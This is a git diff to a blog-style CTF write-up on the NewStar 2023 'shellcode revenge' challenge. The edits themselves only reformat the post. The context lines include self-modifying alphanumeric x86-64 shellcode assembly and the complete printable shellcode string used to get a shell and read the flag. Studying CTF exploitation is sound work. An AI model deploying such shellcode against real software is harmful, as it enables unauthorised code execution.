@@ -1,7 +1,7 @@
 ---
 title: newstar2023 week2 - shellcode revenge
 date: 2023/10/4 12:00:00
-updated: 2024/7/30 10:28:00
+updated: 2024/8/26 17:18:00
 tags:
     - shellcode
 thumbnail: /assets/newstar2023/regs.png
@@ -32,7 +32,7 @@ xor主要使用rbx，要清空它；rax和rdx都有特定值要存放，所以�
 
 ## Shellcode分析
 
-```as
+```as shellcode
 exec:
 push rdx                         ; R
 pop  rcx                         ; Y set base addr
@@ -67,8 +67,8 @@ xor byte ptr [rcx + 0x44], bl    ; 0YD make 0x05
 syscall                          ; OE is xored by 0YC0YD
 ```
 
-```
-data section:
+```plaintext
+data_section:
 rcx + 'E': 000 ; just padding; shrink it to get a shorter shellcode
 rcx + 'H': 3   ; xor pivot 2
 rcx + 'I': R   ; xor pivot 1
@@ -103,11 +103,11 @@ def toChr(s: str):
 *RYH1YZH3YZ2YI0YJ0YN0YQ0YY2YIH3YJH3YRST2YK0Y8WZ0Y94O4D40WGF2YT0YC0YDOE0003RH607H60R5TYY5EXR*  
 *cat flag*
 
-## 参考资料
+## 参考
 
-[short shellcode](https://blog.csdn.net/A951860555/article/details/110936441)  
-[alphanumeric shellcode编写指南](https://dl.packetstormsecurity.net/papers/shellcode/alpha.pdf)  
-[在线汇编/反汇编器](http://shell-storm.org/online/Online-Assembler-and-Disassembler/)  
-[好用的在线异或](http://i.goto327.top:85/Tools1/XOR.aspx)
+1. [short shellcode](https://blog.csdn.net/A951860555/article/details/110936441)
+2. [alphanumeric shellcode编写指南](https://dl.packetstormsecurity.net/papers/shellcode/alpha.pdf)
+3. [在线汇编/反汇编器](http://shell-storm.org/online/Online-Assembler-and-Disassembler/)
+4. [好用的在线异或](http://i.goto327.top:85/Tools1/XOR.aspx)
 
 Done.
